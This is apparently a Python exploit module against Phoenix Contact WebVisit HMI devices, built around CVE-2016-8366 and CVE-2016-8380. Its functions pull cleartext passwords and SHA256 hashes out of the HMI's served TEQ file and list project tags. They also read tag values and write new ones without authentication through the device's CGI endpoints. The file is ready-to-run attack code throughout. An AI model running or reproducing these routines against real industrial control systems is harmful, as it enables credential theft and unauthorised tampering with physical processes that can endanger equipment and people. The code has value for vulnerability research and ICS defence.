"""Phoenix Contact WebVisit HMI exploits.

CVE-2016-8366: Cleartext password disclosure in WebVisit < 6.40.00.
CVE-2016-8380: Unauthenticated tag read/write via WebVisit HMI.
"""

from __future__ import annotations

import urllib.parse
import urllib.request


def retrieve_passwords(target_ip: str) -> list[dict]:
    """Retrieve cleartext passwords from a WebVisit HMI (CVE-2016-8366).

    Exploits a vulnerability where passwords are stored in
    cleartext (or SHA256) in the TEQ file served by the HMI.

    Args:
        target_ip: IP address of the HMI device.

    Returns:
        List of dictionaries with user_level and password/hash.
    """
    try:
        resp = urllib.request.urlopen(
            f"http://{target_ip}", timeout=5
        )
    except Exception as exc:
        print(f"Cannot connect to {target_ip}: {exc}")
        return []

    main_teq = ""
    for line in resp.readlines():
        if b"MainTEQName" in line:
            main_teq = (
                line.split(b'VALUE="')[1]
                .split(b'"')[0]
                .decode(errors="ignore")
            )

    if not main_teq:
        print("No MainTEQ found on the main page.")
        return []

    try:
        teq_resp = urllib.request.urlopen(
            f"http://{target_ip}/{main_teq}", timeout=5
        )
    except Exception as exc:
        print(f"Cannot fetch {main_teq}: {exc}")
        return []

    all_data = b""
    for line in teq_resp.readlines():
        all_data += line

    results: list[dict] = []
    cleartext_marker = b"\x00\x03\x00\x03\x01\x03\x01\x06\x83\x00"
    hash_marker = b"\x00\x03\x00\x03\x01\x03\x0b\x06\x83\x00@"

    for chunk in all_data.split(b"userLevel\x05\x06\x03\x00\x01"):
        if cleartext_marker in chunk:
            user_level = chunk[:1].decode(errors="ignore")
            after = chunk.split(cleartext_marker)[1]
            pass_len = int(after[:1].hex(), 16)
            password = after[1 : 1 + pass_len].decode(
                errors="ignore"
            )
            print(
                f"Password for user level {user_level}: {password}"
            )
            results.append({
                "user_level": user_level,
                "password": password,
                "type": "cleartext",
            })
        elif hash_marker in chunk:
            user_level = chunk[:1].decode(errors="ignore")
            hash_val = (
                chunk.split(hash_marker)[1][:64].decode(
                    errors="ignore"
                )
            )
            print(f"Hash for user level {user_level}: {hash_val}")
            results.append({
                "user_level": user_level,
                "hash": hash_val,
                "type": "sha256",
            })

    if not results:
        print("No passwords or hashes found (patched?).")

    return results


def get_tags(target_ip: str) -> tuple[str, list[str]] | None:
    """Retrieve the project name and tag list from a WebVisit HMI.

    Args:
        target_ip: IP address of the HMI device.

    Returns:
        Tuple of (project_name, tag_list), or None on failure.
    """
    try:
        resp = urllib.request.urlopen(
            f"http://{target_ip}", timeout=5
        )
    except Exception as exc:
        print(f"Cannot connect to {target_ip}: {exc}")
        return None

    project = None
    for line in resp.readlines():
        if b"ProjectName" in line:
            project = (
                line.split(b'VALUE="')[1]
                .split(b'"')[0]
                .decode(errors="ignore")
            )

    if not project:
        print("No ProjectName found on the main page.")
        return None

    print(f"Found project: {project}")

    try:
        tcr_resp = urllib.request.urlopen(
            f"http://{target_ip}/{project}.tcr", timeout=5
        )
    except Exception as exc:
        print(f"Cannot fetch {project}.tcr: {exc}")
        return None

    tags: list[str] = []
    found_tag_header = False
    for line in tcr_resp.readlines():
        if line.startswith(b"#!-- N ="):
            found_tag_header = True
            count = line.split(b"=")[1].strip().decode()
            print(f"Found {count} tags:")
        if (
            found_tag_header
            and b"#" not in line
            and b";" in line
        ):
            tag = line.split(b";")[0].strip().decode()
            tags.append(tag)
            print(f"  - {tag}")

    return project, tags


def read_tag_values(
    target_ip: str,
    tags: list[str],
) -> list[tuple[str, str]]:
    """Read current values for a list of HMI tags (CVE-2016-8380).

    Args:
        target_ip: IP address of the HMI device.
        tags: List of tag names to read.

    Returns:
        List of (tag_name, value) tuples.
    """
    post = "<body>"
    post += f"<item_list_size>{len(tags)}</item_list_size>"
    post += "<item_list>"
    for tag in tags:
        post += f"<i><n>{tag}</n></i>"
    post += "</item_list></body>"

    url = f"http://{target_ip}/cgi-bin/ILRReadValues.exe"
    req = urllib.request.Request(url=url, data=post.encode())
    resp = urllib.request.urlopen(req)

    all_data = ""
    for item in resp.readlines():
        all_data += item.decode(errors="ignore")

    values: list[tuple[str, str]] = []
    for item in all_data.split("<i>"):
        if "</i>" not in item:
            continue
        name = item.split("<n>")[1].split("</n>")[0]
        value = item.split("<v>")[1].split("</v>")[0]
        values.append((name, value))

    return values


def write_tag_value(
    target_ip: str,
    tag_name: str,
    value: str,
) -> bool:
    """Write a new value to an HMI tag (CVE-2016-8380).

    Args:
        target_ip: IP address of the HMI device.
        tag_name: Name of the tag to modify.
        value: New value to write.

    Returns:
        True if the write was sent successfully.
    """
    url = (
        f"http://{target_ip}/cgi-bin/writeVal.exe"
        f"?{tag_name}+{value}"
    )
    try:
        urllib.request.urlopen(url, timeout=5)
        print(f"Wrote {tag_name} = {value}")
        return True
    except Exception as exc:
        print(f"Failed to write tag: {exc}")
        return False
